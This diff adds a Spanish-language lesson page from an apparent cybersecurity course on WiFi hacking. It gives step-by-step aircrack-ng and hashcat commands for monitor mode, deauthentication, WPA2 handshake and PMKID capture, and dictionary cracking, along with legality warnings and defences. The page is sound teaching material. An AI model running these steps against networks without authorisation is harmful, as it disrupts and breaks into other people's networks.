@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Lección 14: Hacking WiFi — Auditoría de redes inalámbricas: WPA/WPA2, Aircrack-ng, captura de handshakes y cracking de claves WiFi.">
+    <title>Lección 14: Hacking WiFi — CyberPath 2026</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+        <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+    <div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
+    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
+    <main class="lesson-page">
+        <div class="lesson-breadcrumb"><a href="../index.html">Inicio</a><span>›</span><span>Fase 3</span><span>›</span><span>Lección 14</span></div>
+        <div class="lesson-hero">
+            <div class="lesson-phase-badge" style="background:rgba(255,82,82,0.15);color:#ff5252">Fase 3 — Red Team y Técnicas Avanzadas</div>
+            <h1>Hacking WiFi — Auditoría de redes inalámbricas</h1>
+            <p class="lesson-intro">
+                Las redes WiFi están en <strong>todas partes</strong>: hogares, oficinas, cafeterías. 
+                Y muchas están mal configuradas. En esta lección aprenderás cómo funcionan los protocolos de seguridad 
+                WiFi (<strong>WEP, WPA, WPA2, WPA3</strong>), cómo capturar <strong>handshakes</strong>, 
+                cómo funcionan los <strong>ataques de deautenticación</strong> y cómo crackear claves con 
+                <strong>Aircrack-ng</strong>. Todo de forma ética y en tu laboratorio.
+            </p>
+        </div>
+        <div class="lesson-toc"><h3>📋 Contenido de esta lección</h3>
+            <ol>
+                <li><a href="#como-funciona-wifi">¿Cómo funciona WiFi?</a></li>
+                <li><a href="#protocolos-seguridad">Protocolos de seguridad WiFi: WEP, WPA, WPA2, WPA3</a></li>
+                <li><a href="#hardware">Hardware necesario: adaptadores en modo monitor</a></li>
+                <li><a href="#aircrack">Suite Aircrack-ng: herramientas esenciales</a></li>
+                <li><a href="#modo-monitor">Poner la tarjeta en modo monitor</a></li>
+                <li><a href="#escaneo">Escaneo de redes WiFi</a></li>
+                <li><a href="#deauth">Ataques de deautenticación</a></li>
+                <li><a href="#handshake">Captura del handshake WPA2</a></li>
+                <li><a href="#cracking">Cracking de la clave WiFi</a></li>
+                <li><a href="#evil-twin">Evil Twin y ataques avanzados</a></li>
+                <li><a href="#defensa">Cómo defenderse</a></li>
+                <li><a href="#practica">Práctica</a></li>
+            </ol>
+        </div>
+
+        <div class="lesson-section" id="como-funciona-wifi"><h2><span class="section-icon">📡</span> 1. ¿Cómo funciona WiFi?</h2>
+            <p class="lesson-text"><strong>WiFi (IEEE 802.11)</strong> es una tecnología que permite la comunicación inalámbrica entre dispositivos usando ondas de radio. Funciona en dos bandas principales:</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Banda</th><th>Frecuencia</th><th>Características</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>2.4 GHz</strong></td><td>2.400 – 2.4835 GHz</td><td>Mayor alcance, más interferencias, 14 canales (1, 6, 11 sin solapamiento)</td></tr>
+                    <tr><td><strong>5 GHz</strong></td><td>5.150 – 5.825 GHz</td><td>Menor alcance, más velocidad, menos interferencias, más canales</td></tr>
+                    <tr><td><strong>6 GHz (WiFi 6E)</strong></td><td>5.925 – 7.125 GHz</td><td>Nuevo espectro, menos saturación, requiere hardware moderno</td></tr>
+                </tbody>
+            </table></div>
+            <div class="lesson-callout"><strong>📌 Conceptos clave:</strong>
+                <ul>
+                    <li><strong>AP (Access Point)</strong>: El router o punto de acceso que emite la señal WiFi.</li>
+                    <li><strong>SSID</strong>: El nombre de la red WiFi que ves al conectarte.</li>
+                    <li><strong>BSSID</strong>: La dirección MAC del Access Point.</li>
+                    <li><strong>Canal</strong>: La frecuencia específica donde opera la red.</li>
+                    <li><strong>Beacon Frames</strong>: Paquetes que el AP envía constantemente anunciando su existencia.</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="protocolos-seguridad"><h2><span class="section-icon">🔒</span> 2. Protocolos de seguridad WiFi</h2>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Protocolo</th><th>Cifrado</th><th>Seguridad</th><th>Estado</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>WEP</strong></td><td>RC4 (24-bit IV)</td><td>❌ Roto completamente</td><td>Obsoleto — se crackea en segundos</td></tr>
+                    <tr><td><strong>WPA</strong></td><td>TKIP (RC4 mejorado)</td><td>⚠️ Vulnerable</td><td>Deprecado</td></tr>
+                    <tr><td><strong>WPA2-Personal</strong></td><td>AES-CCMP (PSK)</td><td>🟡 Vulnerable a fuerza bruta offline</td><td>Más común actualmente</td></tr>
+                    <tr><td><strong>WPA2-Enterprise</strong></td><td>AES + RADIUS (802.1X)</td><td>✅ Más seguro</td><td>Usado en empresas</td></tr>
+                    <tr><td><strong>WPA3-Personal</strong></td><td>SAE (Dragonfly)</td><td>✅ Resistente a ataques offline</td><td>Nuevo estándar</td></tr>
+                </tbody>
+            </table></div>
+            <div class="lesson-callout"><strong>🔑 ¿Por qué WPA2-PSK es vulnerable?</strong>
+                <p>Cuando un cliente se conecta a un AP con WPA2-PSK, ambos realizan un <strong>4-Way Handshake</strong>. Si capturas este handshake, puedes intentar crackear la contraseña <strong>offline</strong> sin límite de intentos. La seguridad depende 100% de la complejidad de la contraseña.</p>
+            </div>
+            <div class="lesson-diagram"><pre>
+    4-Way Handshake WPA2:
+    
+    Cliente ──[ANonce]──────────────▶ AP
+    Cliente ◀──[SNonce + MIC]─────── AP
+    Cliente ──[Confirmación + MIC]──▶ AP
+    Cliente ◀──[GTK + MIC]────────── AP
+    
+    ✅ Ambos derivan la PTK (clave de sesión) sin enviar la contraseña
+    ⚠️ Pero si capturas este intercambio, puedes probarlo contra un diccionario
+            </pre><p class="diagram-caption">El 4-Way Handshake: capturarlo es la clave para el ataque offline</p></div>
+        </div>
+
+        <div class="lesson-section" id="hardware"><h2><span class="section-icon">🔧</span> 3. Hardware necesario</h2>
+            <p class="lesson-text">Para hacer auditoría WiFi necesitas un <strong>adaptador USB WiFi que soporte modo monitor e inyección de paquetes</strong>. No todos los adaptadores lo soportan.</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Adaptador</th><th>Chipset</th><th>Modo Monitor</th><th>Inyección</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Alfa AWUS036ACH</strong></td><td>RTL8812AU</td><td>✅</td><td>✅</td></tr>
+                    <tr><td><strong>Alfa AWUS036ACHM</strong></td><td>MT7612U</td><td>✅</td><td>✅</td></tr>
+                    <tr><td><strong>TP-Link TL-WN722N v1</strong></td><td>AR9271</td><td>✅</td><td>✅</td></tr>
+                    <tr><td><strong>Panda PAU09</strong></td><td>RT5572</td><td>✅</td><td>✅</td></tr>
+                </tbody>
+            </table></div>
+            <div class="lesson-callout"><strong>⚠️ Importante:</strong> Si usas VirtualBox/VMware, debes pasar el adaptador USB directamente a la VM de Kali Linux (USB passthrough). La tarjeta WiFi interna del portátil generalmente NO soporta modo monitor.</div>
+        </div>
+
+        <div class="lesson-section" id="aircrack"><h2><span class="section-icon">✈️</span> 4. Suite Aircrack-ng</h2>
+            <p class="lesson-text"><strong>Aircrack-ng</strong> es la suite de herramientas más usada para auditoría WiFi. Viene preinstalada en Kali Linux.</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Herramienta</th><th>Función</th></tr></thead>
+                <tbody>
+                    <tr><td><code>airmon-ng</code></td><td>Poner la tarjeta en modo monitor / volver a modo managed</td></tr>
+                    <tr><td><code>airodump-ng</code></td><td>Escanear redes WiFi, capturar paquetes y handshakes</td></tr>
+                    <tr><td><code>aireplay-ng</code></td><td>Inyectar paquetes: deautenticación, fake auth, etc.</td></tr>
+                    <tr><td><code>aircrack-ng</code></td><td>Crackear claves WEP/WPA con diccionarios</td></tr>
+                    <tr><td><code>airbase-ng</code></td><td>Crear Access Points falsos (Evil Twin)</td></tr>
+                    <tr><td><code>airdecap-ng</code></td><td>Descifrar tráfico capturado una vez conocida la clave</td></tr>
+                </tbody>
+            </table></div>
+        </div>
+
+        <div class="lesson-section" id="modo-monitor"><h2><span class="section-icon">👁️</span> 5. Poner la tarjeta en modo monitor</h2>
+            <p class="lesson-text">El <strong>modo monitor</strong> permite a tu tarjeta WiFi capturar TODOS los paquetes del aire, no solo los destinados a tu MAC. Es el equivalente al modo promiscuo en Ethernet.</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Modo Monitor</span></div>
+                <pre><code><span style="color:#546e7a"># Ver interfaces WiFi disponibles</span>
+<span style="color:#00e676">$</span> iwconfig
+
+<span style="color:#546e7a"># Matar procesos que interfieren</span>
+<span style="color:#00e676">$</span> sudo airmon-ng check kill
+
+<span style="color:#546e7a"># Activar modo monitor en wlan0</span>
+<span style="color:#00e676">$</span> sudo airmon-ng start wlan0
+
+<span style="color:#546e7a"># Verificar: ahora la interfaz es wlan0mon</span>
+<span style="color:#00e676">$</span> iwconfig
+<span style="color:#ffcc02">wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.437 GHz</span>
+
+<span style="color:#546e7a"># Para volver al modo normal:</span>
+<span style="color:#00e676">$</span> sudo airmon-ng stop wlan0mon</code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="escaneo"><h2><span class="section-icon">📊</span> 6. Escaneo de redes WiFi</h2>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Escaneo con airodump-ng</span></div>
+                <pre><code><span style="color:#546e7a"># Escanear TODAS las redes en 2.4 GHz</span>
+<span style="color:#00e676">$</span> sudo airodump-ng wlan0mon
+
+<span style="color:#546e7a"># Escanear en 5 GHz</span>
+<span style="color:#00e676">$</span> sudo airodump-ng wlan0mon --band a
+
+<span style="color:#546e7a"># Filtrar por un canal específico y BSSID del AP objetivo</span>
+<span style="color:#00e676">$</span> sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
+
+<span style="color:#546e7a"># Esto genera archivos: captura-01.cap, captura-01.csv, etc.</span>
+
+<span style="color:#ffcc02"># Salida de airodump-ng:
+# BSSID              CH  ENC   AUTH  ESSID
+# AA:BB:CC:DD:EE:FF   6  WPA2  PSK   MiRedWiFi
+# 11:22:33:44:55:66  11  WPA2  PSK   Vecino_WiFi</span></code></pre>
+            </div>
+            <div class="lesson-callout"><strong>📌 Columnas importantes:</strong>
+                <ul>
+                    <li><strong>BSSID</strong>: MAC del Access Point</li>
+                    <li><strong>CH</strong>: Canal donde opera</li>
+                    <li><strong>ENC</strong>: Tipo de cifrado (WEP/WPA/WPA2)</li>
+                    <li><strong>ESSID</strong>: Nombre de la red</li>
+                    <li><strong>#Data</strong>: Paquetes de datos capturados</li>
+                    <li><strong>STATION</strong>: Clientes conectados al AP</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="deauth"><h2><span class="section-icon">💥</span> 7. Ataques de deautenticación</h2>
+            <p class="lesson-text">Un <strong>ataque de deautenticación</strong> envía paquetes falsos al AP o al cliente diciéndoles que se desconecten. Esto fuerza al cliente a reconectarse, y en esa reconexión se genera el <strong>handshake</strong> que necesitamos capturar.</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Deautenticación</span></div>
+                <pre><code><span style="color:#546e7a"># Enviar 10 paquetes de deauth a TODOS los clientes del AP</span>
+<span style="color:#00e676">$</span> sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span style="color:#546e7a"># Enviar deauth a un cliente ESPECÍFICO</span>
+<span style="color:#00e676">$</span> sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+<span style="color:#546e7a"># Significado de los parámetros:</span>
+<span style="color:#546e7a"># -0        = ataque de deautenticación</span>
+<span style="color:#546e7a"># 10        = enviar 10 paquetes (0 = infinito)</span>
+<span style="color:#546e7a"># -a BSSID  = MAC del Access Point</span>
+<span style="color:#546e7a"># -c MAC    = MAC del cliente específico</span></code></pre>
+            </div>
+            <div class="lesson-callout"><strong>⚠️ Legalidad:</strong> Los ataques de deautenticación están <strong>prohibidos</strong> fuera de redes que te pertenezcan o tengas autorización escrita para auditar. En muchos países es ilegal interrumpir comunicaciones inalámbricas.</div>
+        </div>
+
+        <div class="lesson-section" id="handshake"><h2><span class="section-icon">🤝</span> 8. Captura del handshake WPA2</h2>
+            <p class="lesson-text">El proceso completo para capturar un handshake WPA2:</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Captura de Handshake</span></div>
+                <pre><code><span style="color:#546e7a"># PASO 1: Modo monitor</span>
+<span style="color:#00e676">$</span> sudo airmon-ng check kill
+<span style="color:#00e676">$</span> sudo airmon-ng start wlan0
+
+<span style="color:#546e7a"># PASO 2: Escanear para identificar tu AP objetivo</span>
+<span style="color:#00e676">$</span> sudo airodump-ng wlan0mon
+
+<span style="color:#546e7a"># PASO 3: Capturar en el canal del AP objetivo</span>
+<span style="color:#00e676">$</span> sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+
+<span style="color:#546e7a"># PASO 4: En OTRA terminal, enviar deauth para forzar reconexión</span>
+<span style="color:#00e676">$</span> sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+<span style="color:#546e7a"># PASO 5: Esperar... cuando captures el handshake verás:</span>
+<span style="color:#ffcc02"> CH  6 ][ Elapsed: 30 s ][ WPA handshake: AA:BB:CC:DD:EE:FF</span>
+
+<span style="color:#546e7a"># El handshake está en: handshake-01.cap</span></code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="cracking"><h2><span class="section-icon">🔓</span> 9. Cracking de la clave WiFi</h2>
+            <p class="lesson-text">Una vez capturado el handshake, puedes intentar crackear la contraseña <strong>offline</strong>.</p>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Cracking con Aircrack-ng</span></div>
+                <pre><code><span style="color:#546e7a"># Crackear con diccionario (rockyou.txt)</span>
+<span style="color:#00e676">$</span> aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
+
+<span style="color:#546e7a"># Si encuentra la clave verás:</span>
+<span style="color:#ffcc02">KEY FOUND! [ contraseña123 ]</span></code></pre>
+            </div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Cracking con Hashcat (más rápido, usa GPU)</span></div>
+                <pre><code><span style="color:#546e7a"># Convertir .cap a formato hashcat</span>
+<span style="color:#00e676">$</span> hcxpcapngtool -o hash.hc22000 handshake-01.cap
+
+<span style="color:#546e7a"># Crackear con GPU (modo 22000 = WPA-PBKDF2-PMKID+EAPOL)</span>
+<span style="color:#00e676">$</span> hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+<span style="color:#546e7a"># Con reglas para probar variaciones</span>
+<span style="color:#00e676">$</span> hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+            </div>
+            <div class="lesson-callout"><strong>💡 Tip:</strong> Si la contraseña es compleja (>12 caracteres, con símbolos), el ataque de diccionario probablemente fallará. Por eso WPA2 con contraseñas fuertes sigue siendo seguro en la práctica.</div>
+        </div>
+
+        <div class="lesson-section" id="evil-twin"><h2><span class="section-icon">👿</span> 10. Evil Twin y ataques avanzados</h2>
+            <p class="lesson-text">Un <strong>Evil Twin</strong> es un AP falso que imita una red legítima. Cuando la víctima se conecta al AP falso, todo su tráfico pasa por ti (Man-in-the-Middle).</p>
+            <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Ataque</th><th>Descripción</th><th>Herramienta</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Evil Twin</strong></td><td>AP falso con el mismo nombre que el legítimo</td><td><code>hostapd-mana</code>, <code>wifiphisher</code></td></tr>
+                    <tr><td><strong>PMKID Attack</strong></td><td>Capturar PMKID sin necesidad de deauth ni handshake</td><td><code>hcxdumptool</code>, <code>hashcat</code></td></tr>
+                    <tr><td><strong>KARMA Attack</strong></td><td>Responder a CUALQUIER Probe Request de los clientes</td><td><code>hostapd-mana</code></td></tr>
+                    <tr><td><strong>Pixie Dust (WPS)</strong></td><td>Explotar WPS mal implementado</td><td><code>reaver</code>, <code>bully</code></td></tr>
+                </tbody>
+            </table></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Ataque PMKID (sin deauth)</span></div>
+                <pre><code><span style="color:#546e7a"># Capturar PMKID directamente del AP</span>
+<span style="color:#00e676">$</span> sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
+
+<span style="color:#546e7a"># Convertir a formato hashcat</span>
+<span style="color:#00e676">$</span> hcxpcapngtool -o pmkid.hc22000 captura.pcapng
+
+<span style="color:#546e7a"># Crackear</span>
+<span style="color:#00e676">$</span> hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="defensa"><h2><span class="section-icon">🛡️</span> 11. Cómo defenderse</h2>
+            <div class="lesson-callout"><strong>Medidas de protección:</strong>
+                <ul>
+                    <li>✅ Usar <strong>WPA3-SAE</strong> si es posible (resistente a ataques offline)</li>
+                    <li>✅ Contraseñas WiFi de <strong>al menos 16 caracteres</strong> con letras, números y símbolos</li>
+                    <li>✅ Desactivar <strong>WPS</strong> (vulnerable a Pixie Dust y fuerza bruta de PIN)</li>
+                    <li>✅ Usar <strong>WPA2-Enterprise (802.1X)</strong> en entornos corporativos</li>
+                    <li>✅ Monitorizar <strong>AP no autorizados</strong> (rogue AP detection)</li>
+                    <li>✅ Actualizar el firmware del router regularmente</li>
+                    <li>✅ No conectarse a redes WiFi abiertas sin VPN</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lesson-section" id="practica"><h2><span class="section-icon">🏋️</span> 12. Práctica</h2>
+            <div class="practice-box"><h4>✅ ¿Completaste esta lección?</h4>
+                <ul>
+                    <li>Entiendes la diferencia entre WEP, WPA, WPA2 y WPA3</li>
+                    <li>Sabes cómo poner una tarjeta en modo monitor</li>
+                    <li>Puedes escanear redes WiFi con airodump-ng</li>
+                    <li>Entiendes qué es el 4-Way Handshake y por qué es vulnerable</li>
+                    <li>Puedes capturar un handshake WPA2 en tu laboratorio</li>
+                    <li>Sabes crackear la clave con aircrack-ng y hashcat</li>
+                    <li>Conoces ataques avanzados: Evil Twin, PMKID, Pixie Dust</li>
+                </ul>
+            </div>
+        
+            <div class="external-labs">
+                <h4>🔗 Practica en plataformas reales</h4>
+                <ul>
+                    <li><a href="https://tryhackme.com/room/wifihacking101" target="_blank" rel="noopener noreferrer">TryHackMe: Wifi Hacking 101</a><span class="lab-tag lab-tag-free">Gratis</span></li>
+                </ul>
+            </div>
+
+            <div class="quiz-box" id="quiz-container"></div>
+        </div>
+
+        <div class="lesson-nav">
+            <a href="leccion-13-active-directory.html"><span class="nav-label">← Anterior</span><span class="nav-title">Lección 13: Active Directory</span></a>
+            <a href="leccion-15-redteam.html" class="next"><span class="nav-label">Siguiente →</span><span class="nav-title">Lección 15: Red Team</span></a>
+        </div>
+    </main>
+    <footer class="footer"><div class="container"><div class="footer-content"><p style="color:var(--text-muted);font-size:0.85rem;text-align:center">CyberPath 2026 — Curso Completo de Ciberseguridad</p></div></div></footer>
+
+    <script src="../quiz.js"></script>
+    <script>
+        const quizQuestions = [
+          {
+                    "question": "¿Qué captura un handshake de WPA2?",
+                    "options": [
+                              "La contraseña WiFi en texto plano",
+                              "Un intercambio de 4 paquetes (4-way handshake) que contiene material criptográfico para verificar contraseñas offline",
+                              "Todo el tráfico de la red WiFi",
+                              "La dirección MAC del router"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Qué hace un ataque de deautenticación?",
+                    "options": [
+                              "Crackea la contraseña WiFi directamente",
+                              "Fuerza a clientes conectados a desconectarse de la red, provocando que se reconecten y generen un nuevo handshake",
+                              "Cambia la contraseña del router",
+                              "Bloquea permanentemente el acceso WiFi"
+                    ],
+                    "correct": 1
+          },
+          {
+                    "question": "¿Qué modo debe estar la tarjeta WiFi para capturar paquetes de otras redes?",
+                    "options": [
+                              "Modo managed",
+                              "Modo ad-hoc",
+                              "Modo monitor",
+                              "Modo bridge"
+                    ],
+                    "correct": 2
+          }
+];
+        window._quizQuestions = window._quizQuestions || {};
+        window._quizQuestions['leccion-14'] = quizQuestions;
+        document.addEventListener('DOMContentLoaded', () => {
+            CyberQuiz.init('leccion-14', quizQuestions);
+            const explanations = [
+                "El 4-way handshake de WPA2 contiene un desafío cifrado. Con ese handshake puedes probar contraseñas offline (sin estar en la red). Por eso necesitas capturarlo primero.",
+                "El ataque deauth envía frames de desautenticación falsos. Los clientes se desconectan y al reconectarse generan un nuevo handshake que tú capturas para crackear offline.",
+                "El modo monitor permite capturar TODOS los paquetes WiFi del aire, no solo los dirigidos a tu dispositivo. Es requisito para sniffing y captura de handshakes."
+            ];
+            document.querySelectorAll('.quiz-question').forEach((q, i) => {
+                if (explanations[i]) q.dataset.explanation = explanations[i];
+            });
+        });
+    </script>
+</body></html>
